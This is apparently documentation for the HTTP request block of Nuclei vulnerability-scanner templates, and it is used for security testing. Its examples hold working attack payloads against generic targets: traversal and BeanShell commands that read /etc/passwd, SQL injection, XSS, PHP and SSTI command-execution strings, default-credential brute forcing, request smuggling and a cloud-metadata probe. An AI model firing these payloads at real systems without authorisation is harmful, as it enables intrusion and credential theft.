# HTTP

HTTP protocol requests can be created by using `requests` block. It is one of the main focus of Nuclei and a number of capabilities are provided for working with it. The supported fields and functionalities are described below - 

## path

Path contains the URLs to make HTTP requests to. Dynamic Variables are also supported. A list of variables is provided below - 

| Variable | Description of the variable | Example                                           |
|----------|-----------------------------|---------------------------------------------------|
| BaseURL  | Input URL                   | https://www.projectdiscovery.io:443/test/file.php |
| RootURL  | Scheme and Input Host       | https://www.projectdiscovery.io:443               |
| Hostname | Input Host                  | www.projectdiscovery.io:443                       |
| Host     | Input Host without port     | www.projectdiscovery.io                           |
| Port     | Port of Input               | 443                                               |
| Path     | Path of Input               | /test                                             |
| File     | File of Input               | file.php                                          |
| Scheme   | Scheme of Input             | https                                             |

Along with these, DNS variables for the URL domain are also available.

```yaml
# example path variations for making requests to
path: 
  - '{{BaseURL}}/phpmyadmin'
  - '{{BaseURL}}/.git/config'
  - '{{BaseURL}}/bin/wcm/search/gql.json?query=type:User%20limit:..1&pathPrefix=&p.ico'
  - '{{BaseURL}}/monitoring?part=graph&graph=usedMemory%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
```

Multiple paths can also be specified in a request which will be requested for the target.

## raw

Raw contains HTTP requests in Raw format. The raw request supports dynamic variables and other placeholders defined above as well. 

```yaml
raw:
  - |
    POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.1
    Host: {{Hostname}}

    echo
    echo
    cat /etc/passwd 2>&1

  - |
    POST /bsh.servlet.BshServlet HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    bsh.script=exec("cat+/etc/passwd");&bsh.servlet.output=raw

 - |
   PUT {{BaseURL}}/v1/kv/{{randstr}} HTTP/1.1
   Host: {{Hostname}}

   <!DOCTYPE html><script>alert(document.domain)</script>

 - |
   GET {{BaseURL}}/v1/kv/{{randstr}}%3Fraw HTTP/1.1
   Host: {{Hostname}}
```

## unsafe

Unsafe flag enables [rawhttp](https://github.com/projectdiscovery/rawhttp) client for sending HTTP requests which enables complete request controls and allows sending malformed requests for testing issues like HTTP request smuggling, Host header injection, CRLF with malformed characters and more. 

rawhttp library is disabled by default and can be enabled by including `unsafe: true` in the request block. Non-RFC compliant requests can only be sent by using `unsafe` flag. Unsafe feature only works with Raw requests and requires raw request to being with `|+` prefix.

```yaml
raw:
  - |+
```

Some examples of unsafe templates are provided below.

```yaml
# Detecting oracle weblogic LFI with unsafe requests
raw:
  - |+
    GET {{path}} HTTP/1.1
    Host: {{Hostname}}
payloads:
  path:
    - .//WEB-INF/weblogic.xml
    - .//WEB-INF/web.xml
unsafe: true
```

```yaml
# Detecting SAP Memory Pipes (MPI) Desynchronization with unsafe
raw:
  - |+
    GET {{sap_path}} HTTP/1.1
    Host: {{Hostname}}
    Content-Length: 82646
    Connection: keep-alive

    {{repeat("A", 82642)}}

    GET / HTTP/1.1
    Host: {{Hostname}}
payloads:
  sap_path:
    - /sap/admin/public/default.html
    - /sap/public/bc/ur/Login/assets/corbu/sap_logo.png
unsafe: true
```

## attack & payloads

Payloads contains a list of payloads for the HTTP request. The payloads can be either key-values or path to a file containing a list of values.

Attack type is the type of payload combination to perform. The different payload types are - `batteringram`, `pitchfork` and `clusterbomb`.

```yaml
# Bruteforcing nagios login using payloads, attack and raw requests.
raw:
  - |
    GET /nagios/side.php HTTP/1.1
    Host: {{Hostname}}
    Authorization: Basic {{base64(username + ':' + password)}}

payloads:
  username:
    - nagiosadmin
    - root
  password:
    - nagiosadmin
    - nagiosxi
attack: pitchfork
```

```yaml
# Testing hetzner AWS exposed metadata
raw:
  - |+
    GET http://{{hostval}}/v1/metadata/private-networks HTTP/1.1
    Host: {{hostval}}
payloads:
  hostval:
    - aws.interact.sh
    - 169.254.169.254
unsafe: true
```

## method

Method contains the HTTP request methods. The method can be any of the following - `GET`, `POST`, `PUT`, `DELETE`, `CONNECT`, `OPTIONS`, `TRACE`, `PATCH`, `PURGE`, `DEBUG`.

```yaml
# Example Methods
method: POST
```

## body

Body contains the optional HTTP request body.

```yaml
# Example request bodies
body: |
  username=dd' or extractvalue(0x0a,concat(0x0a,810663301*872821376))#&password=dd&submit=+%B5%C7+%C2%BC+
```

```yaml
body: "<?xml version=\"1.0\" encoding=\"utf-8\"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
```

```yaml
body: |
  page=index');${system('echo lotuscms_rce | md5sum')};#
```

## headers

Headers contains a list of key-value Headers for the HTTP Request.

```yaml
# HTTP Request headers examples
headers:
  Accept: ../../../../../../../../etc/passwd{{
```

```yaml
headers:
    X-Trigger-XSS: "<script>alert(1)</script>"
```

```yaml
headers:
  Referer: "{{BaseURL}}/webadmin/admin/service_manager_data.php"
```

```yaml
headers:
  User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@{{interactsh-url}}
```

## redirects & max-redirects

Redirects specifies whether HTTP redirects should be followed. `max-redirects` can be used to specify the maximum number of redirects that should be followed.

By default, redirects are not followed. When enabled with only `redirects` flag, `max-redirect` is set to 10 automatically which should be enough for most cases.

```yaml
redirects: true
max-redirects: 2
```

## threads

Threads specifies the number of threads to use to send the request. This enables connection pooling when used along with no `Connection: close` header allowing reuse of TCP connection for HTTP request.

```yaml
# connection pooling with threads
raw:
  - |
    GET /protected HTTP/1.1
    Host: {{Hostname}}
    Authorization: Basic {{base64('admin:§password§')}}
attack: batteringram
payloads:
  password: password.txt
threads: 40
```

## pipelining 

HTTP Pipelining support has been added which allows multiple HTTP requests to be sent on the same connection inspired from [http-desync-attacks-request-smuggling-reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn).

Before running HTTP pipelining based templates, make sure the running target supports HTTP Pipeline connection, otherwise nuclei engine fallbacks to standard HTTP engine.

If you want to confirm the given domain or list of subdomains supports HTTP Pipelining, httpx has a flag `-pipeline` to do so.

The following attributes are configurable regarding pipelining - 

- `pipeline` - Enable HTTP Pipelining
- `pipeline-concurrent-connections` - Number of concurrent connections
- `pipeline-requests-per-connection` - Number of requests per connection


An example configuring showing pipelining attributes of nuclei.

```yaml
unsafe: true
pipeline: true
pipeline-concurrent-connections: 40
pipeline-requests-per-connection: 100
```

## race & race_count

To enable race condition check within template, race attribute can be set to true and race_count defines the number of simultaneous request you want to initiate.

```yaml
# Enabling race condition testing
race: true
race_count: 10
```

Below is an example template where the same request is repeated for 10 times using the gate logic.

```yaml
requests:
  - raw:
      - |
        POST /coupons HTTP/1.1
        Host: {{Hostname}}

        promo_code=20OFF

    race: true
    race_count: 10
```

You can simply replace the POST request with any suspected vulnerable request and change the race_count as per your need, and it's ready to run.

```
nuclei -t race.yaml -target https://api.target.com
```


## Other Attributes

### max-size

Maximum size of HTTP response body to read in bytes. This can be used to limit the size of response read for large contents and reduce processing time.

```yaml
# Example heapdump template with max-size
path:
  - "{{BaseURL}}/heapdump"
  - "{{BaseURL}}/actuator/heapdump"
max-size: 2097152 # 2MB - Max Size to read from server response
```

### read-all

Read-all enables reading of the entire response body, ignoring any content length header for Unsafe Mode HTTP requests. This is useful for cases like HTTP Smuggling where the content length is not reliable and the response contains extra data that needs to be parsed.

```yaml
# read entire unsafe http request body
read-all: true
```

### req-condition

Request condition assigns numbers of HTTP requests and preserves their history, which can be used later during matching / extracting for multiple requests.

Requests are assigned numbers starting from `_1`, `_2`, etc to their part names.

```yaml
# Example of req-condition attribute
- raw:
    - |
      POST /cgi-bin/logo_extra_upload.cgi HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/octet-stream

      {{randstr}}.txt
      dixell-xweb500-filewrite
    - |
      GET /logo/{{randstr}}.txt HTTP/1.1
      Host: {{Hostname}}
  req-condition: true
  matchers-condition: and
  matchers:
    - type: dsl
      dsl:
        - 'contains(body_1, "successful")'
        - 'contains(body_2, "dixell-xweb500-filewrite")'
```

### cookie-reuse

Cookie-reuse enables a cookie jar which preserves cookie values set by Targets and forwards them for other requests in a template.

This is useful for Two-Step templates or Post-Authentication templates, where some form of session needs to be maintained between requests.

```yaml
# Example cookie-reuse by logging into jenkins and verifying succesful login
raw:
  - |
    POST /j_spring_security_check HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded
    
    j_username=admin&j_password=admin&from=%2F&Submit=Sign+in
  - |
    GET / HTTP/1.1
    Host: {{Hostname}}
cookie-reuse: true
req-condition: true
matchers:
  - type: dsl
    dsl:
      - 'contains(body_3, "/logout")'
      - 'contains(body_3, "Dashboard [Jenkins]")'
    condition: and
```

### stop-at-first-match

Stop-at-first-match stops execution of the request as soon as the first match is found. This is useful when detecting a vulnerability that can occur on multiple paths but only interesting once or during credential bruteforce when we want to stop as soon as we find something.

```yaml
# Bruteforcing application.wadl with stop-at-first-match
method: GET
path:
  - "{{BaseURL}}/application.wadl"
  - "{{BaseURL}}/application.wadl?detail=true"
  - "{{BaseURL}}/api/application.wadl"
  - "{{BaseURL}}/api/v1/application.wadl"
  - "{{BaseURL}}/api/v2/application.wadl"
stop-at-first-match: true
```

### skip-variables-check

Skip-variables-check skips checks for unresolved variables. This flag is provided to skip variable `{{}}` check for templates which may use these values in exploits, ex. ssti templates.

```yaml
# SSTI template with skip-variable-check
path:
  - "{{BaseURL}}"
headers:
  Cookie: "CSRF-TOKEN=rnqvt{{shell_exec('cat /etc/passwd')}}to5gw; simcify=uv82sg0jj2oqa0kkr2virls4dl"
skip-variables-check: true
```

### iterate-all

Iterate-all enables iteration of all values extracted from internal extractors.

```yaml
# Example template that visits all links in robots.txt with iterate-all
raw:
  - |
    GET /robots.txt HTTP/1.1
    Host: {{Hostname}}
  - |
    GET {{endpoint}} HTTP/1.1
    Host: {{Hostname}}
iterate-all: true
extractors:
  - part: body
    name: endpoint
    internal: true
    type: regex
    regex:
      - "(?m)/([a-zA-Z0-9-_/\\\\]+)"
```